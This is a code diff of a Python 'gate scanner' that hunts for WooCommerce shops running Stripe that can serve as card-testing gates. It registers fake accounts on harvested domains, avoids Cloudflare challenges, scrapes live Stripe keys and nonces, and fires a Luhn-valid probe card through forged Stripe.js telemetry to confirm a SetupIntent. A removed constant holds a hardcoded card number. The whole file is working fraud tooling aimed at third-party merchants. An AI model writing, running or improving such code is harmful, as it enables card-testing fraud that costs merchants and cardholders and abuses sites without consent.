@@ -2,22 +2,17 @@
 import asyncio
 import json
 import os
-import random
 import re
 import socket
-import string
 import sys
 import time
-import uuid
 from concurrent.futures import ThreadPoolExecutor
 from curl_cffi.requests import AsyncSession
 
+import gate_client as gc
+
 sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 
-PROBE_DUMMY_CARD = {"number": "5175465382242090", "mm": "09", "yy": "2030", "cvc": "018"}
-
-def rand_str(k=8):
-    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))
 
 def resolve_dns(host: str) -> str | None:
     try:
@@ -41,24 +36,14 @@ async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore) -> dict
         except Exception:
             return None
 
-    # Check Cloudflare hardcore challenges (Turnstile / captcha block)
-    is_hard_cf = (
-        "Just a moment..." in html or 
-        "Attention Required! | Cloudflare" in html or
-        "challenge-platform" in html or
-        "cf-turnstile-wrapper" in html
-    )
-    if is_hard_cf:
+    if gc.is_cloudflare_challenge(html):
         return None
-        
-    reg_nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
-    reg_nonce = reg_nonce_m.group(1) if reg_nonce_m else None
+
+    reg_nonce = gc.extract_reg_nonce(html)
     if not reg_nonce:
         return None
-        
-    pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', html)
-    pk_live = pk_m[0] if pk_m else None
 
+    pk_live = gc.extract_pk_live(html) or None
     has_stripe_indicator = (
         pk_live is not None or
         "wc-stripe" in html or
@@ -79,53 +64,38 @@ async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore) -> dict
 async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore) -> dict | None:
     """Stage 2: Real registration POST -> check wordpress_logged_in.
        Stage 3: Scrape /my-account/add-payment-method/ -> extract pk_live, upe_nonce / legacy_nonce.
-       Stage 4: Live SetupIntent confirm probe -> confirm working gate.
+       Stage 4: Live SetupIntent confirm probe (Radar Telemetry v2021 + rotating Luhn-valid probe PAN).
     """
     async with sem:
         try:
             async with AsyncSession(impersonate="chrome131", verify=False) as s:
                 reg_url = f"{base}/my-account/"
-                
-                # Fetch fresh page to inspect form fields
+
+                # Fresh page for form inspection & nonce freshness
                 r_get = await s.get(reg_url, timeout=8)
                 if r_get.status_code != 200:
                     return None
                 html = r_get.text
-                
-                nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
-                reg_nonce = nonce_m.group(1) if nonce_m else initial_nonce
-                has_username = 'name="username"' in html
-                
-                uname = f"usr_{rand_str(8)}"
-                email = f"alex.{rand_str(8)}@gmail.com"
-                pwd = f"Sec_{rand_str(8)}!9aA"
-                
+
+                reg_nonce = gc.extract_reg_nonce(html) or initial_nonce
+                ident = gc.random_identity()
+
                 body = {
-                    "email": email,
-                    "password": pwd,
+                    "email": ident["email"],
+                    "password": ident["password"],
                     "woocommerce-register-nonce": reg_nonce,
                     "_wp_http_referer": "/my-account/",
-                    "register": "Register"
+                    "register": "Register",
                 }
-                if has_username:
-                    body["username"] = uname
+                if 'name="username"' in html:
+                    body["username"] = ident["username"]
+                gc.extract_honeypot_fields(gc.extract_register_form_html(html), body)
 
-                # Scrape hidden honeypots
-                reg_form = re.search(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', html, re.S)
-                if reg_form:
-                    hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', reg_form.group(1))
-                    for inp in hidden_inputs:
-                        nm = re.search(r'name=["\']([^"\']+)["\']', inp)
-                        vl = re.search(r'value=["\']([^"\']*)["\']', inp)
-                        if nm and vl and nm.group(1) not in body:
-                            body[nm.group(1)] = vl.group(1)
+                await s.post(reg_url, data=body,
+                             headers={"Origin": base, "Referer": reg_url}, timeout=12)
 
-                headers = {"Origin": base, "Referer": reg_url}
-                r_post = await s.post(reg_url, data=body, headers=headers, timeout=12)
-                
                 cookies = s.cookies.get_dict()
-                logged_in = any("wordpress_logged_in" in k for k in cookies)
-                if not logged_in:
+                if not any("wordpress_logged_in" in k for k in cookies):
                     return None
 
                 # === STAGE 3: Authenticated Scrape add-payment-method ===
@@ -133,68 +103,34 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
                 r_pm = await s.get(add_pm_url, timeout=10)
                 pm_html = r_pm.text
 
-                # Check if test mode explicitly
                 if "pk_test_" in pm_html and "pk_live_" not in pm_html:
                     return None
 
-                pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
-                pk = pk_m[0] if pk_m else ""
-                
-                upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
-                upe_nonce = upe_m.group(1) if upe_m else ""
-                
-                legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', pm_html)
-                legacy_nonce = legacy_m.group(1) if legacy_m else ""
-
-                if not legacy_nonce:
-                    # Alternative legacy nonce parameter
-                    leg2_m = re.search(r'createSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
-                    if leg2_m:
-                        legacy_nonce = leg2_m.group(1)
-
+                scraped = gc.scrape_gate(pm_html)
+                pk, upe_nonce, legacy_nonce = scraped["pk"], scraped["upe_nonce"], scraped["legacy_nonce"]
                 if not pk or (not upe_nonce and not legacy_nonce):
                     return None
 
-                # === STAGE 4: SetupIntent Live Mode Probe ===
-                fp = {"guid": str(uuid.uuid4()), "muid": str(uuid.uuid4()), "sid": str(uuid.uuid4())}
-                tok_body = {
-                    "type": "card",
-                    "billing_details[name]": "Alex Vance",
-                    "billing_details[address][postal_code]": "10001",
-                    "billing_details[address][country]": "US",
-                    "card[number]": PROBE_DUMMY_CARD["number"],
-                    "card[cvc]": PROBE_DUMMY_CARD["cvc"],
-                    "card[exp_month]": PROBE_DUMMY_CARD["mm"],
-                    "card[exp_year]": PROBE_DUMMY_CARD["yy"],
-                    "guid": fp["guid"],
-                    "muid": fp["muid"],
-                    "sid": fp["sid"],
-                    "pasted_fields": "number,cvc",
-                    "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
-                    "referrer": base,
-                    "time_on_page": "32100",
-                    "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
-                    "client_attribution_metadata[merchant_integration_source]": "elements",
-                    "client_attribution_metadata[merchant_integration_subtype]": "card-element",
-                    "client_attribution_metadata[merchant_integration_version]": "2017",
-                    "key": pk,
-                }
-                tok_headers = {"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}
-                
-                r_tok = await s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers, timeout=8)
+                # === STAGE 4: Live Mode Probe — v2021 telemetry + m-cookie prefetch ===
+                telem = gc.stripe_telemetry(base, pk)
+                probe = gc.gen_probe_card()
+                tok_body = gc.tokenize_body(probe, telem, base)
+
+                try:
+                    await s.get("https://m.stripe.com/6",
+                                headers={"Origin": base, "Referer": f"{base}/", "Accept": "*/*"},
+                                timeout=5)
+                except Exception:
+                    pass
+
+                r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
+                                     data=tok_body, headers=gc.TOKENIZE_HEADERS, timeout=8)
                 tok_data = r_tok.json()
                 if "id" not in tok_data:
                     return None
 
                 pm_id = tok_data["id"]
 
-                ajax_headers = {
-                    "Origin": base,
-                    "Referer": add_pm_url,
-                    "X-Requested-With": "XMLHttpRequest",
-                    "Accept": "application/json",
-                }
-                
                 if upe_nonce:
                     conf_payload = {
                         "action": "wc_stripe_create_and_confirm_setup_intent",
@@ -204,13 +140,11 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
                     }
                     ajax_endpoint = f"{base}/wp-admin/admin-ajax.php"
                 else:
-                    conf_payload = {
-                        "stripe_source_id": pm_id,
-                        "nonce": legacy_nonce,
-                    }
+                    conf_payload = {"stripe_source_id": pm_id, "nonce": legacy_nonce}
                     ajax_endpoint = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"
 
-                r_conf = await s.post(ajax_endpoint, data=conf_payload, headers=ajax_headers, timeout=12)
+                r_conf = await s.post(ajax_endpoint, data=conf_payload,
+                                      headers=gc.ajax_headers_for(base, add_pm_url), timeout=12)
                 conf_resp = r_conf.json()
 
                 raw_str = json.dumps(conf_resp).lower()
@@ -247,14 +181,16 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
 
 async def main():
     print("=" * 80)
-    print("[*] ADVANCED GATE SCANNER v4 (curl_cffi Chrome TLS Multi-Surface Engine)")
+    print("[*] ADVANCED GATE SCANNER v5 (curl_cffi Chrome TLS + Shared Gate Engine)")
     print("=" * 80)
-    
-    # 1. Load candidate domains
+
+    # 1. Load candidate domains — три независимых потока добычи
     domains = []
     candidates = [
-        "data/harvested_domains.txt", "data/probe_targets.txt",
-        "harvested_domains.txt", "probe_targets.txt"
+        "data/harvested_domains.txt",   # forums harvester lane
+        "data/dork_harvested.txt",      # dork harvesters lane
+        "data/probe_targets.txt",       # manual targets
+        "harvested_domains.txt", "probe_targets.txt",  # legacy cwd fallbacks
     ]
     for fn in candidates:
         if os.path.exists(fn):
@@ -323,7 +259,7 @@ async def main():
     print("\n" + "=" * 80)
     print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES IN POOL: {len(final_ready_gates)}")
     print("=" * 80)
-    
+
     for g in final_ready_gates:
         pk_display = g.get('pk_live', '')[:24] + "..." if g.get('pk_live') else "N/A"
         print(f"  [READY] {g['domain']:32} | Type: {g.get('gate_type', 'unknown'):18} | PK: {pk_display}")
